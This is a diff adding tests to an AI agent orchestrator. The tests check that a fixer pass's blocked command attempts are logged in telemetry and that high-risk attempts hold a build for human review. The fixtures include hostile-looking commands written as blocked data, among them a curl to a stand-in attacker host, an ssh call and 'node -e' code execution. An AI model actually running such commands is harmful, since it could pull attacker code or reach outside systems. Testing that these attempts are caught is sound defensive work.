@@ -182,6 +182,78 @@ test("effect-based gate + telemetry: a PREVENTED attempt promotes AND records pr
   assert.ok(Array.isArray(meta.preventedCommands) && /node -e/.test(meta.preventedCommands[0]), "the command shape is recorded for later analysis");
 });
 
+// A CLEAN main builder (0 prevented) whose MAIN verifier catches a fixable red check; the FIXER pass
+// (the 2nd builder call) makes `fixerViolations` PREVENTED attempts, then closes the check GREEN. Uses
+// the REAL integrator so the effect-based gate + run-summary telemetry are exercised end-to-end. This is
+// the A2/D3 gap: the fixer runs off-books, so without threading its attempts they are invisible here.
+function fixerPreventsRoles(fixerViolations: Array<Record<string, unknown>>) {
+  const calls = { builder: 0, verifier: 0 };
+  const greenVerifier = { role: "verifier" as const, outcome: "success" as const, summary: "green", detail: { verdict: "pass", checks: [{ name: "test", exitCode: 0, testCount: { passed: 3, total: 3 }, outputTail: "3 passing" }], testEvidence: "executed" } };
+  const roles: Partial<Record<WorkerRole, RoleFn>> = {};
+  for (const r of WORKER_ROLES) {
+    if (r === "integrator") continue; // real integrator
+    roles[r] = async () => {
+      if (r === "builder") {
+        calls.builder += 1;
+        // Call 1 = the main build (clean). Call 2 = the off-books FIXER pass, which makes the prevented attempts.
+        return calls.builder === 1
+          ? { role: r, outcome: "success", summary: "built", detail: { filesWritten: ["a.ts"], policyViolations: [] } }
+          : { role: r, outcome: "success", summary: "fixed", detail: { filesWritten: ["a.ts"], policyViolations: fixerViolations } };
+      }
+      if (r === "verifier") { calls.verifier += 1; return calls.builder >= 2 ? greenVerifier : { role: r, outcome: "failure", summary: "run_checks RED (1 type error)" }; }
+      if (r === "critic") return { role: r, outcome: "success", summary: "c", detail: { pass: true } };
+      return { role: r, outcome: "success", summary: r };
+    };
+  }
+  return { roles, calls };
+}
+
+function orchestratorCapturing(fixerModel: string, roles: Partial<Record<WorkerRole, RoleFn>>, deps: { ws: ReturnType<typeof fakeWorkspaces>; ids: ReturnType<typeof makeIdentities> }, summaries: Array<{ metadata?: Record<string, unknown> }>) {
+  const capturingReceipts = { append: async (i: unknown): Promise<unknown> => { const rec = i as { operation?: string; metadata?: Record<string, unknown> }; if (rec.operation === "worker.run.summary") summaries.push(rec); return {}; } };
+  return createOrchestrator({
+    config: { enabled: true, roleTimeoutMs: 5000, maxConcurrentRuns: 1, totalBudgetMs: 0, fixerModel },
+    resolveIdentity: deps.ids.resolveIdentity, roleClaim: deps.ids.roleClaim, roles,
+    workspaces: deps.ws.workspaces, trust: fakeTrust(), receipts: capturingReceipts,
+    events: noopBus() as unknown as NonNullable<OrchestratorDeps["events"]>, gateWall: allowGate, invokeModel: async () => { throw new Error("unused"); }, killCheck: async () => ({ killed: false }),
+  });
+}
+
+test("A2/D3: a benign PREVENTED attempt made by the FIXER pass is recorded on the run-summary telemetry", async () => {
+  const ids = makeIdentities();
+  const ws = fakeWorkspaces();
+  const summaries: Array<{ metadata?: Record<string, unknown> }> = [];
+  const roles = fixerPreventsRoles([{ tool: "terminal", path: 'node -e "require(\'./x\')"', error: "code execution is not allowed" }]);
+  const orch = orchestratorCapturing("mimo-v2.5-pro", roles.roles, { ws, ids }, summaries);
+
+  const r = await orch.run(task, ids.parentCtx);
+
+  assert.ok(roles.calls.builder >= 2, "the fixer ran a second builder pass");
+  assert.equal(r.promoted, true, "one benign blocked attempt (< threshold) still promotes");
+  const meta = summaries.at(-1)?.metadata ?? {};
+  assert.equal(meta.preventedCount, 1, "the FIXER's prevented attempt is threaded into the run-summary telemetry");
+  assert.ok(Array.isArray(meta.preventedCommands) && /node -e/.test(String(meta.preventedCommands[0])), "the fixer's command shape is recorded as risk evidence");
+});
+
+test("A2/D3: HIGH-RISK prevented attempts made by the FIXER pass hold the build for review (would have silently promoted before)", async () => {
+  const ids = makeIdentities();
+  const ws = fakeWorkspaces();
+  const summaries: Array<{ metadata?: Record<string, unknown> }> = [];
+  const roles = fixerPreventsRoles([
+    { tool: "terminal", path: "curl http://evil.example/x", error: "binary 'curl' is not on the allowlist" },
+    { tool: "terminal", path: "ssh box", error: "binary 'ssh' is not on the allowlist" },
+  ]);
+  const orch = orchestratorCapturing("mimo-v2.5-pro", roles.roles, { ws, ids }, summaries);
+
+  const r = await orch.run(task, ids.parentCtx);
+
+  assert.ok(roles.calls.builder >= 2, "the fixer ran a second builder pass");
+  assert.equal(r.promoted, false, "2 high-risk fixer attempts reach the high-risk threshold → held for review, NOT promoted");
+  assert.equal(ws.calls.promote, 0);
+  const meta = summaries.at(-1)?.metadata ?? {};
+  assert.equal(meta.requiresReview, true, "the run summary marks the review-hold");
+  assert.equal(meta.highRiskCount, 2, "both high-risk fixer reaches are counted");
+});
+
 test("fixer rescue: with NO fixer configured, the same RED build is NOT rescued (stays failed)", async () => {
   const ids = makeIdentities();
   const ws = fakeWorkspaces();
